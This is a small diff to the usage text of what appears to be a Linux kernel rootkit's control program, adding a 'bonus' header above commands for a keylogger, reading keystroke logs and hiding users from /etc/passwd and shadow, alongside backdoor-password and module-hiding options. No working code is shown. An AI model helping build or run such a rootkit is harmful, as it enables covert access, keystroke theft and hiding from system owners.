@@ -21,6 +21,7 @@ static void usage(const char *prog)
     printf("  backdoor_pass <pass>      Set backdoor password\n");
     printf("  hide_mod                  Hide module from lsmod\n");
     printf("  show_mod                  Show module in lsmod\n");
+    printf("\n[bonus — non-6.19 kernels only]\n");
     printf("  keylog_toggle             Toggle keylogger on/off\n");
     printf("  keylog_read               Read and flush keylog buffer\n");
     printf("  hide_user <username>      Hide user from /etc/passwd & shadow\n");
